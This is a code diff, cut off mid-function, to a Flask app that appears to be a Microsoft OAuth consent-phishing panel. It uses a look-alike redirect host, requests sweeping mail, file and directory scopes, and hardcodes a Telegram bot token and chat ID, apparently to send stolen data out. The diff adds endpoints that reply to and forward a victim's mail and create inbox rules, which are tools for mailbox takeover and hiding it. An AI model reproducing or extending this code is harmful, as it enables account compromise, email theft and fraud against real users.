@@ -18,9 +18,6 @@ app = flask.Flask(__name__)
 
 # --- CONFIGURATION ---
 # Your specific tokens are hardcoded below. 
-# You can still override these in Render's Environment Variables if needed, 
-# but the values below will be used by default.
-
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
 
@@ -28,9 +25,9 @@ TELEGRAM_CHAT_ID = "8877118461"
 MS_CLIENT_ID = "7115da65-3ffa-4b8b-8fc4-dee1e90c6b8d"
 MS_REDIRECT_URI = "https://appsingingfix.onrender.com/callback"
 MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.Read Files.ReadWrite Sites.Read.All User.Read.All"
-MS_TENANT = "common" # Use 'common' for multi-tenant, or specific tenant ID
+MS_TENANT = "common"
 
-# Fail fast if critical vars are missing (though they are hardcoded above)
+# Fail fast if critical vars are missing
 if not all([TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MS_REDIRECT_URI, MS_CLIENT_ID]):
     raise EnvironmentError("Missing required configuration variables")
 
@@ -99,8 +96,6 @@ def get_valid_session(refresh_token):
                 return session["access_token"], session["user_info"], refresh_token
         
         # If no session or expired, attempt refresh
-        # Note: We hold the lock during refresh to prevent multiple simultaneous refreshes
-        # for the same token, which can invalidate it.
         new_access, new_refresh, user_info = _refresh_token(refresh_token)
         
         if new_access:
@@ -186,7 +181,6 @@ def health_check():
 @app.route("/")
 def index():
     token = flask.request.args.get('token', '')
-    # Minimal dashboard HTML to keep response time low
     dashboard_html = """
     <!DOCTYPE html>
     <html>
@@ -196,7 +190,6 @@ def index():
             body { font-family: sans-serif; margin: 20px; background: #f4f4f4; }
             .card { background: white; padding: 20px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
             h2 { color: #0078d4; }
-            pre { background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto; }
         </style>
     </head>
     <body>
@@ -364,4 +357,42 @@ def api_send():
     result, status, _ = graph_api("/me/sendMail", method="POST", body=body, token=token)
     return flask.jsonify(result), status
 
-@app.route("/api/re
+@app.route("/api/reply", methods=["POST"])
+def api_reply():
+    token = flask.request.args.get('token', '')
+    data = flask.request.json
+    body = {
+        "message": {
+            "subject": f"Re: {data.get('subject', '')}",
+            "body": {"contentType": "HTML", "content": data.get("body", "")}
+        },
+        "comment": data.get("comment", "")
+    }
+    result, status, _ = graph_api(f"/me/messages/{data.get('messageId')}/reply", method="POST", body=body, token=token)
+    return flask.jsonify(result), status
+
+@app.route("/api/forward", methods=["POST"])
+def api_forward():
+    token = flask.request.args.get('token', '')
+    data = flask.request.json
+    body = {
+        "message": {
+            "subject": f"Fwd: {data.get('subject', '')}",
+            "body": {"contentType": "HTML", "content": data.get("body", "")},
+            "toRecipients": [{"emailAddress": {"address": addr}} for addr in data.get("to", [])]
+        }
+    }
+    result, status, _ = graph_api(f"/me/messages/{data.get('messageId')}/forward", method="POST", body=body, token=token)
+    return flask.jsonify(result), status
+
+@app.route("/api/rules")
+def api_get_rules():
+    token = flask.request.args.get('token', '')
+    data, status, _ = graph_api("/me/mailFolders/inbox/messageRules", token=token)
+    return flask.jsonify(data)
+
+@app.route("/api/rules", methods=["POST"])
+def api_add_rule():
+    token = flask.request.args.get('token', '')
+    data = flask.request.json
+    body = {
